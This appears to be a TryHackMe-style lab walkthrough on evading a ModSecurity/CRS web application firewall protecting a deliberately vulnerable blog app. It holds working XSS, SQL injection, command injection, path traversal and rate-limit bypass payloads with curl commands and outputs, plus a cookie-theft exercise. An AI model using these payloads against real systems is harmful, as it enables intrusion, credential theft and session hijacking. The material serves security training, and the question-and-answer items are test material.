“WAF bypass” essentially means discovering an input that allows a malicious payload to reach the application despite the protections implemented by the web application (WAF). 

The Core Rule Set (CRS) (opens in new tab) is a collection of generic detection rules for web application firewalls designed to identify common web attacks. It primarily uses pattern and signature-based matching and performs normalisation steps to identify malicious inputs. This approach makes CRS effective in blocking many known payloads. However, it can be evaded when an application and the WAF normalise or parse input differently, or when attackers use encoding techniques.

The attached to this task contains a Blog application that is protected by ModSecurity and is configured with the CRS. Additionally, the demonstrations and exercises also leverage the same setup. The Blog application will be used to complete all tasks in this room. You will need to use the AttackBox to start an server for specific tasks, or utilise the software and command-line tools that are installed on it.


 Blog application, accessible at ://MACHINE_IP/,  contains multiple vulnerabilities. ModSecurity WAF leverages CRS and custom rules to protect the server. In this section, we will focus on exploiting the vulnerability in the comment functionality while also bypassing the WAF protection. The specific version of CRS (3.3.5) that is in use contains a known bypass that allows a cross-site scripting () vulnerability to be exploited.

In CRS, the REQUEST-941-APPLICATION-ATTACK-XSS.conf configuration file primarily blocks attacks. It contains rule IDs 941110 and 941160, which detect the use of script tags, HTML tags, event handlers, and more. 
Blocked XSS attempts

Navigate to http://MACHINE_IP/post/3 (opens in new tab) and post a comment that contains the following XSS payloads:

    <script>alert("xss")</script>
    <img src=x onerror=alert("xss")>

 Observe that the WAF blocks these attempts and returns a "403 Forbidden" error page, as shown in the images below.

The basic <script> tag XSS payload is used in the comment feature

The Forbidden error page that is returned when submitting common XSS payloads

The OWASP CRS v3.3.5 effectively detects both basic and most advanced payloads. However, a bypass (opens in new tab) was discovered that evades these rulesets. The technique leverages the eval() and atob() functions in an anchor tag (i.e., <a>). Additionally, Unicode characters and HTML entities were used to bypass regex matching.
The Known Bypass

Using the payload <a href=javascript:eval(atob("YWxlcnQoInhzcyIp"))>test</a>, where the Base64-encoded string is equivalent to alert("xss"), we can test and observe that using eval() and atob() alone will not work. This is due to the regex matching performed by rule ID 941170, which blocks the use of such functions and the JavaScript scheme.

This constraint can be bypassed by using Unicode characters for part of the blocked strings, replacing colons with &colon;, and obfuscating the JavaScript string by adding a carriage return HTML entity (i.e., &#x0D;) somewhere in the string.  

In the Blog application, post a comment that contains the following payload and observe that the WAF fails to block the attack:

<a href=ja&#x0D;vascript&colon;\u0065val(\u0061tob("YWxlcnQoInhzcyIp"))>test</a>

The image below shows that the payload successfully bypassed the WAF, and clicking the hyperlink in the comment executes the payload.

The XSS payload successfully bypassed the WAF

Keeping software patched should be treated as routine work, especially for security tools like WAFs. Even for experienced teams, it is easy to fall behind on updates. Delaying fixes leaves avoidable gaps that attackers can exploit. 

 

Answer the questions below

The admin user periodically checks the "Welcome to the Blog" post for new comments. Leverage the WAF bypass covered in this task by crafting an XSS payload that will send the admin's cookie to your HTTP server. What is the value of the cookie?


While Tasks 4 and 5 focused on bypassing WAFs through encoding, obfuscation, and parsing inconsistencies, this task explores how manipulating the protocol itself can evade detection. Many WAFs only inspect specific  methods, headers, or request components, creating blind spots that attackers can exploit.

In this task, we will explore techniques that leverage protocol-level manipulation:

    Method-Based Filtering Bypass
    Header Manipulation (Rate Limiting)
    Testing Alternative Methods

Method-Based Filtering

WAFs often apply different rules based on the method used. For instance, a WAF might rigorously check POST requests for  injection but apply minimal or no filtering to GET requests. This creates an opportunity: if the application accepts the same parameter via multiple methods, attackers can switch methods to bypass the WAF.
POST-Only Filtering

Consider a WAF rule that only checks POST requests for OR-based injection patterns:
Rule 6001

SecRule REQUEST_METHOD "@streq POST" \
    "id:6001,phase:2,chain,deny,status:403"
    SecRule ARGS "@rx \s+OR\s+"
    

This rule only triggers when the request method equals POST and the arguments contain " OR " (i.e., a space-OR-space pattern). GET requests with identical SQL injection payloads bypass this check entirely.
Putting it into Practice - SQL Injection via Method Switching

The Blog application features a comment search function at http://MACHINE_IP/comment/add (opens in new tab), which accepts both GET and POST methods. This endpoint has SQL injection in the search parameter:

sql = f"SELECT * FROM posts WHERE content LIKE '%{search}%'"

Open a terminal and try an OR-based injection payload via POST:
Post Request

curl -X POST 'http://MACHINE_IP/comment/add' -d "search=test' OR 1=1--"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at localhost Port 80</address>
</body></html>
    

Observe that Rule 6001 blocked the POST request because it contains " OR " with spaces around it.

Now, send the identical payload using the GET method instead:
GET Request

curl 'http://MACHINE_IP/comment/add?search=test%27%20OR%201=1--'

  "search_results": [
    [
      1,
      "Welcome to the Blog",
      "This is our first blog post. Welcome to our platform!",
      "admin",
      "2025-11-17 07:27:12"
    ],
    [
      2,
      "Understanding SQL Injection",
      "SQL Injection is a code injection technique used to attack data-driven applications.",
      "admin",
      "2025-11-17 07:27:12"
    ],
    [
      3,
      "Cross-Site Scripting Explained",
      "XSS attacks occur when malicious scripts are injected into web pages.",
      "alice",
      "2025-11-17 07:27:12"
    ]
  ]
}
    

In the response above, observe that the injection succeeded. Rule 6001 only checks POST requests, so the GET request with the identical payload was not inspected for the OR pattern.

GET request with OR-based SQL injection bypasses Rule 6001

You can now combine this method bypass with UNION-based injection to extract sensitive data. Since Rule 2002 from Task 2 still blocks "UNION SELECT" with a space, we'll use comment obfuscation from Task 4:
GET Request

curl -i 'http://MACHINE_IP/comment/add?search=x%27%20OR%201=1%20UNION/**/SELECT%20id,username,password,email,1%20FROM%20users--'
/1.1 200 OK
Date: Mon, 17 Nov 2025 14:23:49 GMT
Server: Werkzeug/3.0.1 Python/3.10.12
Content-Type: text/html; charset=utf-8
Content-Length: 4805
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN

  "search_results": [
    [
      1,
      "Welcome to the Blog",
      "This is our first blog post. Welcome to our platform!",
      "admin",
      "2025-11-17 07:27:12"
    ],
    [
      1,
      "admin",
      "0192023a7bbd73250516f069df18b500",
      "admin@blog.com",
      1
    ],
    [
      2,
      "Understanding SQL Injection",
      "SQL Injection is a code injection technique used to attack data-driven applications.",
      "admin",
      "2025-11-17 07:27:12"
    ],
    [
      2,
      "user1",
      "5f4dcc3b5aa765d61d8327deb882cf99",
      "user1@blog.com",
      1
    ],
    [
      3,
      "Cross-Site Scripting Explained",
      "XSS attacks occur when malicious scripts are injected into web pages.",
      "alice",
      "2025-11-17 07:27:12"
    ],
    [
      3,
      "alice",
      "7abdccbea8473767e91378e37850d296",
      "alice@blog.com",
      1
    ]
  ]
}
    

In the response above, observe that user credentials, including usernames and MD5-hashed passwords, were successfully extracted.
Header Manipulation

headers control how requests are routed, processed, and interpreted. Many applications rely on specific headers for operational purposes, while WAFs may not adequately inspect them. This creates bypass opportunities through header injection and manipulation.
X-Forwarded-For & Rate Limiting Bypass

The X-Forwarded-For header is commonly used to identify the client's IP address when requests pass through a proxy or load balancer. However, many applications trust this header without validation, allowing attackers to spoof their IP address and bypass rate limiting.

The Blog application's API endpoint at /api/posts implements rate limiting (5 requests per minute per IP). The application code demonstrates the vulnerability:
Source Code //posts

@app.route('/api/posts')
def api_posts():
    # Rate limiting based on X-Forwarded-For
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not check_rate_limit(client_ip):
        return jsonify({'error': 'Rate limit exceeded'}), 429
    

The application checks X-Forwarded-For first, which can be arbitrarily set by the client, instead of using only the actual connection IP (request.remote_addr).
Putting it into Practice - Bypassing Rate Limits

First, trigger the normal rate limit by making six consecutive requests:
Rate Limit

user@tryhackme$ for i in {1..6};do curl http://MACHINE_IP/api/posts;done
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{
  "error": "Rate limit exceeded. Please try again later."
}
    

Observe that the 6th request returns a 429 status code with a rate limit error.

Rate limit is triggered after 5 requests

Now bypass the rate limit by spoofing different IP addresses using the X-Forwarded-For header:
Terminal

ubuntu@tryhackme$ for i in {1..20};do curl http://MACHINE_IP/api/posts -H "X-Forwarded-For: 192.168.1.$i";done
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
[...13 more successful responses...]
{"posts":[{"id":3,"title":"Cross-Site Scripting Explained"...}]}
    

In the response above, note that all 20 requests were successful. By modifying the X-Forwarded-For header for each request, the application treats each request as originating from a distinct IP address, thereby completely bypassing the rate-limiting mechanism.

Rate limit is completely bypassed using X-Forwarded-For spoofing

This technique can be used to:

    Bypass rate limits for data extraction
    Perform brute force attacks without being throttled
    Evade IP-based blocking mechanisms
    Access rate-limited resources repeatedly

Testing Alternative Methods

Beyond GET and POST, supports several other methods. While not all applications process these methods, testing them can reveal unexpected behaviour or bypass opportunities. WAFs may not apply the same security rules to all methods.
Common Alternative Methods

    HEAD: Returns only headers (like GET but without body)
    OPTIONS: Returns allowed methods and CORS configuration
    PUT: Often used by REST APIs to update resources
    PATCH: Similar to PUT, for partial updates
    DELETE: Used to delete resources
    TRACE: Echoes back the request (often disabled)

Test which methods the application accepts:
Terminal

ubuntu@tryhackme$ curl-X OPTIONS 'http://MACHINE_IP/'-I 
HTTP/1.1 200 OK
Date: Mon, 17 Nov 2025 14:52:29 GMT
Server: Werkzeug/3.0.1 Python/3.10.12
Content-Type: text/html; charset=utf-8
Allow: GET, OPTIONS, HEAD
Content-Length: 0
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
    

In the responses above, observe that:

    GET, HEAD and OPTIONS are accepted and processed
    PUT returns 405 Method Not Allowed
    The application explicitly lists allowed methods

While the Blog application doesn't provide additional bypass opportunities through alternative methods beyond GET and POST, testing is essential during reconnaissance because:

    Some applications process HEAD requests differently from GET
    OPTIONS can reveal structure and allowed methods
    may accept PUT/PATCH/DELETE with different validation
    Less common methods may have reduced WAF coverage

Answer the questions below

What is the hash password for the user 'admin'?

What HTTP header can be manipulated to bypass the rate-limiting protection on the /api/posts endpoint?


Most WAFs detect malicious requests by looking for known patterns or signatures in locations that an attacker can control (e.g.  , headers, body, cookies, / data). A rule typically normalises the input, runs one or more pattern checks, and then takes an action (e.g. log, increment a score, block).

In the previous task, we explored basic encoding and obfuscation techniques. However, WAF implementations often have additional weaknesses related to how they parse and normalise input data. In this task, we will explore advanced techniques that exploit parsing inconsistencies and implementation quirks. The following techniques can be leveraged to achieve this:

    Charset and Encoding Manipulation ( HTML entities, Unicode escapes)
    Content Truncation and Size Limits
    Regular Expression Logic Errors
    Parameter Manipulation and Missing Variables
    Blocklist Evasion Techniques

Charset and Encoding Manipulation

Encoding techniques extend beyond simple URL-encoding. Modern web applications support various character encodings, and discrepancies between how the WAF and backend application process these encodings can lead to bypasses. The following are some examples of alternative encoding schemes:

    HTML Entities:a => &#97;or&#x61;
    Unicode Escapes: U => \u0055
    Hex Encoding: __init__ => \x5f\x5f\x69\x6e\x69\x74\x5f\x5f

For instance, a WAF might only perform pattern matching on ASCII representations of dangerous strings (i.e., <script>, alert,eval) when detecting cross-site scripting attacks. If the WAF doesn't properly normalise HTML entities or Unicode escapes before matching, this protection can be bypassed by encoding parts of the attack payload.

The following payload can be used to bypass such protection: <img src=x onerror=&#97;lert(1)>
Using HTML Entity Encoding

Using HTML entities is a technique that can be used to evade WAF detection rules. WAFs commonly defend against this technique by decoding HTML entities before checking signatures. However, if a WAF is configured to only look for literal ASCII patterns without applying HTML entity decoding transformations (using t: none), using HTML entities would be an effective technique to evade detection. The following are some examples of payloads using HTML entities:

    <img src=x onerror=&#97;lert(1)>(decimal encoding for 'a')
    <svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>(hex encoding for 'alert')
    <body onload=&#97;&#108;&#101;&#114;&#116;(1)>(full decimal encoding)

When detecting an XSS attack, a WAF may only look for the literal string alert in payloads. This protection can be effectively bypassed by encoding one or more characters as HTML entities, which the browser will decode and execute. The following payload can be used to perform this technique:<img src=x onerror=&#97;lert(1)>
Putting it into Practice - XSS with HTML Entities

Using the techniques covered in this section, we will bypass the WAF to exploit an XSS vulnerability in the Blog application's text processor at http://10.81.129.60/process (opens in new tab). The text processor is protected by Rule 5003, which blocks requests containing the literal string<script>without applying transformation functions:
Rule 5003

SecRule ARGS:text "@contains <script>" \
    "id:5003,phase:2,t:none,deny,status:403,log,msg:'ASCII script tag blocked'"
    

Navigate to http://10.81.129.60/process (opens in new tab)and enter the following XSS payload in the "Text (XSS)" field:

    <script>alert('XSS')</script>

Observe that the WAF blocked the attack and returned a "403 Forbidden" response.

However, since the WAF only checks for the ASCII representation of <script> and doesn't apply HTML entity decoding (note the 't': non-transformation), we can use HTMLentities to encode critical characters. Upon submitting the following payload in the text field, observe that the WAF does not block the attack:

    <img src=x onerror=&#97;lert('XSS_Bypass')>

The HTML entity encoded XSS payload successfully bypassed the WAF and triggered an alert

The browser automatically decodes &#97; to a, converting our payload to <img src=x onerror=alert('XSS Bypass')> after WAF inspection. This demonstrates how encoding discrepancies between the WAF and browser can be exploited.

Try the following alternative encodings to explore this technique further:

Unicode escape sequences:

    <img src=x onerror=\u0061lert(1)>

Mixed encoding:

    <svg onload=&#x61;\u006cert(1)>

Blocklist Evasion Using Alternative Commands

Command injection protection often relies on blocklists of dangerous commands. However, these lists are inherently incomplete as many alternative commands can achieve the same objective. Additionally, shell features like wildcards can be used to obfuscate blocked commands.

In this section, we will exploit the command execution feature of the Blog application at http://10.81.129.60/process (opens in new tab). The application is protected by Rule 5005, which blocks specific commands using a case-insensitive regex:
Rule 5005

SecRule ARGS:cmd "@rx (?i)(cat|ls|whoami|id)" \
    "id:5005,phase:2,t:none,deny,status:403,log,msg:'ASCII command blocked'"
    

Navigate to ://10.81.129.60/process (opens in new tab)and scroll to the "Command" field. Enter the following command:

    cat secret_eddc7de8235bb36940a39a778f7bb962.txt

Note that the WAF blocks the request because 'cat' is explicitly listed in Rule 5005.

The WAF blocked the command injection attempt

However, many alternative commands can read file contents but are not included in the blocklist. Submit the following command:

    head secret_eddc7de8235bb36940a39a778f7bb962.txt

In the JSON response, observe that the command successfully executes and reveals the flag in the cmd_output field:

Alternative command successfully bypassed the blocklist and executed

This demonstrates the fundamental weakness of blocklist-based filtering: it's impossible to enumerate all possible variations of dangerous commands. Try these alternative commands to explore this technique further:

    tail secret_eddc7de8235bb36940a39a778f7bb962.txt
    more secret_eddc7de8235bb36940a39a778f7bb962.txt
    tac secret_eddc7de8235bb36940a39a778f7bb962.txt(cat backwards)

You can also use shell wildcards to obfuscate blocked commands. The shell expands wildcards before the WAF can inspect them:

    /bin/ca? secret_eddc7de8235bb36940a39a778f7bb962.txt (the ? wildcard matches any single character, expanding to cat)

Content Truncation Bypass

WAFs often inspect only a limited portion of input to improve performance. If a WAF only checks the first N characters, attackers can pad their payloads to push malicious content beyond the inspection boundary.

The Blog application's comment system at http://10.81.129.60/comment/add (opens in new tab) is protected by truncation-based rules that demonstrate this weakness:

    Rule 5006: Checks only the first 50 characters of comments for <script>
    Rule 5007: Checks only the first 100 characters of search queries for SQL keywords
    Rule 5008: Checks only the first 30 characters of file paths for ../

XSS Truncation Bypass

Navigate to http://10.81.129.60/comment/add (opens in new tab) and try a basic XSS payload in the "Comment" field using the HTML form:

    <script>alert(1)</script>

Observe that the WAF blocks this because <script>appears within the first 50 characters.
Rule 5006

SecRule ARGS:comment "@rx ^.{0,49}<script>" \
    "id:5006,phase:2,t:none,deny,status:403,log,msg:'Script in first 50 chars blocked'"
    

 Rule 5006 uses the regex pattern ^.{0,49}<script>, which matches if <script> appears anywhere from position 0 to position 49.

WAF blocking the basic script payload in the first 50 characters

However, if we pad the payload with exactly 50 characters before the malicious content:

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<script>alert(1)</script>

The <script> tag now starts at position 50, which is outside the WAF's inspection range (0-49). The regex pattern can only match up to 49 characters before <script>, so our payload at position 50 bypasses the rule entirely.

Submit this payload using the HTML form and observe in the JSON response that the comment is successfully stored in the database:

JSON response showing successful XSS payload storage with comment_status: Added successfully

 

Notice how the JSON breaks down the payload:

    First 50 characters: All A's (the padding that the WAF inspected)
    After 50 characters: The actual XSS payload (which the WAF never checked)
    The WAF only checked the first 50 characters and found them clean

SQL Truncation Bypass

The same technique works for SQL injection. Rule 5007 checks only the first 100 characters of the search parameter.
Rule 5007

SecRule ARGS:search "@rx ^.{0,99}(?:union|select|insert)" \
    "id:5007,phase:2,t:none,deny,status:403,log,msg:'SQL in first 100 chars blocked'"
    

Try the following in the "Search Query" field using the HTML form:

First, attempt a direct injection:

    ' union select 1,2,3,4--

This is blocked because the keyword union appears within the first 100 characters.

Now pad with exactly 100 'A' characters before the SQL payload:

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' union select 1,2,3,4,5--

Observe in the JSON response that the  injection executes successfully, retrieving post data from the database:

JSON showing SQL injection success with search_results containing database rows

The  query executed was:

SELECT * FROM posts WHERE content LIKE '%AAA...(100 A's)...' union select 1,2,3,4,5--%'

The WAF only inspected the first 100 characters (all A's), missed the SQL injection starting at position 102, and the database processed the entire malicious query.
File Path Truncation Bypass

Rule 5008 demonstrates the same vulnerability with path traversal.
Rule 5008

SecRule ARGS:path "@rx ^.{0,29}\.\./" \
    "id:5008,phase:2,t:none,deny,status:403,log,msg:'Traversal in first 30 chars blocked'"
    

It only checks the first 30 characters for the ../ sequence. Try these payloads in the "File Path" field using the HTML form:

Blocked:

    ../etc/passwd (traversal at position 0)
    templates/../etc/passwd (traversal at position 10)

Bypass:

    templates/././././././././././../../../etc/passwd

By using a legitimate-looking prefix of 30 or more characters, the path traversal sequence ../appears at position 31+, beyond the WAF's inspection range.

Submit the bypass payload and observe that the file contents are successfully retrieved:

JSON showing successful file retrieval with file_content displaying /etc/passwd
Understanding Truncation Boundaries

This vulnerability exists because the WAF utilises regular expression (regex) patterns with bounded quantifiers. The pattern ^.{0,N} means "from the start, match 0 to N characters before the dangerous string." Content positioned after N characters is never inspected, but the application still processes the entire input.
Rule 	Pattern 	Inspects Positions 	Bypass Position
5006 (XSS) 	^.{0,49}<script> 	0-49 	50+
5007 (SQL) 	^.{0,99}(?:union|select|insert) 	0-99 	100+
5008 (LFI) 	^.{0,29}\.\./ 	0-29 	30+

Experiment with different padding lengths to verify the exact boundaries. For example, 49 A's + <script> is blocked, but 50 A's + <script> bypasses the filter.
Regular Expression Logic Errors

Regular expressions can have logic flaws that inadvertently create security bypasses. Negative lookaheads, when used incorrectly, can reverse the intended security logic.
Negative Lookahead Bypass

The application has a flawed command filter using negative look ahead that demonstrates poor regex design:
Rule 5012

SecRule ARGS:exec "@rx ^(?!.*admin).*(?:cat|ls).*$" \
    "id:5012,phase:2,t:none,deny,status:403,log,msg:'Command blocked unless admin'"
    

This rule attempts to block commands containing cat or ls UNLESS the string contains "admin". The intent was likely to allow administrators to run these commands, but the implementation creates a critical flaw: anyone can bypass the filter by simply adding "admin" to their command.

Navigate to http://10.81.129.60/validate (opens in new tab) and scroll to the "Command" field. Try executing:

    cat /etc/passwd

The WAF blocks this request because the negative lookahead (?!.*admin) succeeds (no "admin" found), allowing the rest of the pattern to match.

WAF blocking cat command without admin keyword

However, if you add the word "admin" anywhere in the command:

    cat /etc/passwd # admin

The negative lookahead (?!.*admin) fails (because "admin" IS present), which causes the entire rule to NOT match, and the WAF allows the request through. Observe that the command executes successfully:

Successful command execution with admin keyword showing /etc/passwd contents

This demonstrates how complex regex logic can inadvertently create bypasses. The rule should have validated actual administrative privileges rather than relying on a keyword in the command string.
Pattern Splitting with SQL Comments

SQL injection detection often uses regex patterns to match keywords in sequence. However, SQL allows comments between keywords, which can break regex patterns whilst remaining valid SQL.

The Blog application's validation endpoint at http://10.81.129.60/validate (opens in new tab) has a rule that checks for SQL injection patterns:
Rule 5011

SecRule ARGS:input "@rx select.*from.*where" \
    "id:5011,phase:2,t:none,deny,status:403,log,msg:'SQL pattern blocked'"
    

This regex expects the keywords select,from, and where to appear in sequence with any characters between them. Navigate to http://10.81.129.60/validate (opens in new tab) and try a basic SQL injection in the "SQL Input" field:

    select * from users where id=1

The WAF blocks this because the pattern matches.

However, treats /**/ as an empty comment, which can be inserted between keywords to break the regex pattern whilst the database ignores them. Try the following payload:

    select/**/*/from/**/users/**/where/**/id=1

The regex select.*from.*wherecan still match this because .* matches the comments. However, if we reorder or omit keywords, we can further evade detection:

    select * from users (omit WHERE clause)
    ' uNiOn/**/sElEcT 1,username,email,password,5 fRoM users where id==1-- (case insensitive)
    from users select * (reorder keywords - invalid SQL but shows pattern weakness)

Parameter Manipulation and Missing Variables

Many applications and WAFs make assumptions about parameter presence and values. Missing parameters or alternative value representations can bypass validation logic.
Understanding Parameter-Based Bypasses

The Blog application's admin panel has several parameter-based checks:
Rules

           
# Rule 5013: Blocks if 'dangerous' equals "true"
SecRule ARGS:dangerous "@streq true" \
    "id:5013,phase:2,t:none,deny,status:403"

# Rule 5014: Blocks specific admin values
SecRule ARGS:admin "@rx ^(true|1|yes)$" \
    "id:5014,phase:2,t:none,deny,status:403"

# Rule 5016: Validates token format
SecRule ARGS:token "!@rx ^[0-9a-f]{32}$" \
    "id:5016,phase:2,t:none,deny,status:403"

        

These rules have a critical flaw: they only activate when the parameters are present and match specific patterns.
Putting it into Practice - Missing Parameter Bypass

Navigate to http://10.81.129.60/admin/action (opens in new tab). The page expects several security parameters.

Try accessing with explicit dangerous flag:

    http://10.81.129.60/admin/action?dangerous=true&admin=true (opens in new tab)

The WAF blocks this request because dangerous=true matches Rule 5013.

WAF blocking request with dangerous=true

However, if you completely omit the dangerous parameter:

    http://10.81.129.60/admin/action?admin=true (opens in new tab)

Rule 5013 doesn't match (because there's no dangerous parameter to check). However, this still gets blocked by Rule 5014 because admin=true matches the pattern.
Alternative Boolean Values

Rule 5014 only blocks lowercase values true,1, and yes using a case-sensitive regex. Try using alternative boolean representations:

    http://10.81.129.60/admin/action?admin=True (opens in new tab)
    http://10.81.129.60/admin/action?admin=TRUE (opens in new tab)
    http://10.81.129.60/admin/action?admin=on (opens in new tab)

Many programming languages and frameworks treat these as truthy values, but the WAF's case-sensitive regex doesn't match them.

Observe in the response that access is granted and flags are revealed:

JSON response showing access_granted: true and flags array with bypass flags

The application accepts alternative boolean representations like on,True,t, andy, but the WAF only checks for specific lowercase values.
Token Validation Bypass

Rule 5016 validates that tokens are 32 hexadecimal characters. However, what happens when no token is provided?

Try accessing without a token parameter:

    ://10.81.129.60/admin/action?admin=on (opens in new tab)

The validation rule doesn't fire because there's no token to validate. The application might skip authentication checks for missing tokens, and additional bypass flags are revealed.

This demonstrates the importance of explicitly requiring critical parameters, not just validating their format when present.
Answer the questions below

What is the flag revealed when you successfully bypass the command blocklist using an alternative command to read the secret file?

How many 'A' characters are needed as padding to bypass the XSS truncation filter (Rule 5006) that checks the first 50 characters?
